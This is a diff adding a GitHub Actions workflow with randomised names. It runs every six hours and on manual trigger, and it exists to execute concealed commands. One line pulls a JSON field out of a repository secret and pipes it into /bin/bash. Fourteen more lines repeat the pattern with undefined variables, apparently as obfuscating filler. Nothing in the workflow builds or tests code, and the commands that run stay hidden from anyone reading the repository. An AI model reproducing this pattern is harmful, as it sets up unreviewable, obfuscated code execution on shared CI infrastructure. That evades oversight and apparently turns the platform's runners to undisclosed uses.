@@ -1,0 +1,32 @@
+name: weishenhou9876
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '46 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: weishenhou9876
+        env:
+          gods907: ${{ secrets.gods907 }}
+        run: |
+          echo $gods907 | jq -r .ukr5 | /bin/bash
+          echo $mfcc93573 | jq -r .tdy20883 | /bin/bash
+          echo $xnh972 | jq -r .py0 | /bin/bash
+          echo $zrhw229 | jq -r .m29789 | /bin/bash
+          echo $yol64199 | jq -r .ec7210 | /bin/bash
+          echo $qa397 | jq -r .dn1 | /bin/bash
+          echo $aty9 | jq -r .yf820 | /bin/bash
+          echo $xyh936 | jq -r .vjzdx563 | /bin/bash
+          echo $lqdq27 | jq -r .ufja587 | /bin/bash
+          echo $labop4155 | jq -r .pnx34546 | /bin/bash
+          echo $yz64 | jq -r .iww84 | /bin/bash
+          echo $tlrl7012 | jq -r .d354 | /bin/bash
+          echo $qi58 | jq -r .zwbmz13643 | /bin/bash
+          echo $vorun98 | jq -r .ggia8 | /bin/bash
+          echo $nzjjp89 | jq -r .owc15 | /bin/bash
+
